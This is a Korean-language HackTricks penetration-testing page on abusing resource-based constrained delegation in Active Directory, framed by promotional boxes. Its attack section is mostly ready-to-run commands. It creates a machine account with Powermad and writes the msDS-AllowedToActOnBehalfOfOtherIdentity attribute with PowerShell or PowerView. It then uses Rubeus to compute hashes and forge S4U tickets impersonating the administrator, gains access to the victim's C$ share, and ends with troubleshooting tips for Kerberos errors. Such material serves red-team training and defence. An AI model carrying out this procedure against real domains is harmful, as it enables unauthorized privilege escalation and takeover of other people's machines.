# 리소스 기반 제약 위임

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com) 획득
* [**PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **해킹 요령을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소로 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## 리소스 기반 제약 위임의 기본

이것은 기본 [제약 위임](constrained-delegation.md)과 유사하지만 **객체에 대한 권한을 부여하는 대신 서비스에 대해 어떤 사용자든 표현할 수 있는 권한을 부여하는 것**입니다. 리소스 기반 제약 위임은 **객체에 대해 어떤 사용자든 표현할 수 있는 권한을 설정**합니다.

이 경우, 제약된 객체에는 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_라는 속성이 있으며 해당 사용자의 이름을 가질 수 있습니다. 이 사용자는 해당 객체에 대해 다른 사용자를 표현할 수 있습니다.

이 제약 위임과 다른 위임 사이의 또 다른 중요한 차이점은 **기계 계정에 대한 쓰기 권한을 가진 모든 사용자**가 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 것입니다. (일반적으로/GenericWrite/WriteDacl/WriteProperty 등) (다른 형태의 위임에서는 도메인 관리자 권한이 필요했습니다).

### 새로운 개념

제약 위임에서는 사용자의 _userAccountControl_ 값 내의 **`TrustedToAuthForDelegation`** 플래그가 **S4U2Self**를 수행하는 데 필요하다고 말했습니다. 그러나 그것은 완전한 진실이 아닙니다.\
사실은 그 값이 없어도 **서비스**인 경우 (SPN이 있는 경우) **어떤 사용자든 S4U2Self**를 수행할 수 있지만, **`TrustedToAuthForDelegation`**이 있는 경우 반환된 TGS는 **Forwardable**이 되고 그 플래그가 없는 경우 반환된 TGS는 **Forwardable**하지 않습니다.

그러나 **S4U2Proxy**에서 사용된 **TGS**가 **Forwardable**하지 않은 경우 **기본 제약 위임을 악용**하려고 하면 **작동하지 않을 것**입니다. 그러나 **리소스 기반 제약 위임을 악용**하려고 하면 작동합니다 (이것은 취약점이 아니라 기능입니다).

### 공격 구조

> **컴퓨터** 계정에 대한 **쓰기 동등 권한**이 있다면 해당 기계에서 **특권 액세스**를 얻을 수 있습니다.

공격자가 이미 피해자 컴퓨터에 대한 **쓰기 동등 권한**을 가지고 있다고 가정합니다.

1. 공격자는 **SPN**을 가진 계정을 **침해**하거나 생성합니다 ("서비스 A"). **특별한 특권이 없는** 모든 _관리자 사용자_는 최대 10개의 **컴퓨터 객체**(**MachineAccountQuota**)를 **생성**하고 SPN을 설정할 수 있습니다. 따라서 공격자는 컴퓨터 객체를 만들고 SPN을 설정할 수 있습니다.
2. 공격자는 피해자 컴퓨터 (서비스B)에 대한 **쓰기 권한을 악용**하여 서비스A가 해당 피해자 컴퓨터 (서비스B)에 대해 **어떤 사용자든 표현할 수 있도록 리소스 기반 제약 위임을 구성**합니다.
3. 공격자는 Rubeus를 사용하여 특권 액세스를 가진 사용자를 위해 서비스 A에서 서비스 B로의 **전체 S4U 공격** (S4U2Self 및 S4U2Proxy)을 수행합니다.
1. S4U2Self (침해된/생성된 SPN 계정에서): **관리자로부터 나에게 TGS를 요청**합니다 (Forwardable하지 않음).
2. S4U2Proxy: 앞 단계의 **Forwardable하지 않은 TGS**를 사용하여 **관리자로부터 피해자 호스트로의 TGS**를 요청합니다.
3. Forwardable하지 않은 TGS를 사용하더라도 리소스 기반 제약 위임을 악용하고 있기 때문에 작동합니다.
4. 공격자는 **티켓 전달**을 수행하고 사용자를 **표현**하여 **피해자 서비스B에 액세스**할 수 있습니다.

도메인의 _**MachineAccountQuota**_를 확인하려면 다음을 사용할 수 있습니다:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 공격

### 컴퓨터 객체 생성

도메인 내에서 [powermad](https://github.com/Kevin-Robertson/Powermad)를 사용하여 컴퓨터 객체를 생성할 수 있습니다**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** 구성

**activedirectory PowerShell 모듈 사용**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview 사용하기**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 완전한 S4U 공격 수행

우선, 우리는 암호가 `123456`인 새로운 컴퓨터 객체를 생성했으므로 해당 암호의 해시가 필요합니다:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
이것은 해당 계정의 RC4 및 AES 해시를 출력합니다.\
이제, 공격을 수행할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
다음은 Rubeus의 `/altservice` 매개변수를 사용하여 한 번 요청으로 더 많은 티켓을 생성할 수 있습니다:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
사용자에게 "**위임할 수 없음**"이라는 속성이 있다는 점을 유의하십시오. 사용자가 이 속성을 True로 설정하면 해당 사용자를 표현할 수 없습니다. 이 속성은 bloodhound 내에서 확인할 수 있습니다.
{% endhint %}

### 접근

마지막 명령줄은 **완전한 S4U 공격을 수행하고 관리자로부터 피해 호스트로 TGS를 삽입**합니다.\
이 예에서는 관리자로부터 **CIFS** 서비스를 위한 TGS가 요청되었으므로 **C$**에 액세스할 수 있습니다:
```bash
ls \\victim.domain.local\C$
```
### 다양한 서비스 티켓 남용

[**여기에서 사용 가능한 서비스 티켓을 확인하세요**](silver-ticket.md#available-services).

## 케르버로스 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: 이는 케르버로스가 DES 또는 RC4을 사용하지 않도록 구성되어 있고 당신이 단순히 RC4 해시를 제공하고 있는 것을 의미합니다. 적어도 AES256 해시를 Rubeus에 제공하십시오 (또는 rc4, aes128 및 aes256 해시를 제공하십시오). 예시: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: 현재 컴퓨터의 시간이 DC의 시간과 다르며 케르버로스가 제대로 작동하지 않는 것을 의미합니다.
- **`preauth_failed`**: 주어진 사용자 이름 + 해시가 로그인에 작동하지 않는다는 것을 의미합니다. 해시를 생성할 때 사용자 이름에 "$"를 넣는 것을 잊었을 수 있습니다 (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: 이는 다음을 의미할 수 있습니다:
  - 피해자로 변장하려는 사용자가 원하는 서비스에 액세스할 수 없음 (피해자로 변장할 수 없거나 충분한 권한이 없을 수 있음)
  - 요청한 서비스가 존재하지 않음 (winrm 티켓을 요청했지만 winrm이 실행되고 있지 않은 경우)
  - 생성된 가짜 컴퓨터가 취약한 서버에 대한 권한을 잃었으며 다시 부여해야 함

## 참고 자료

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

- **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>
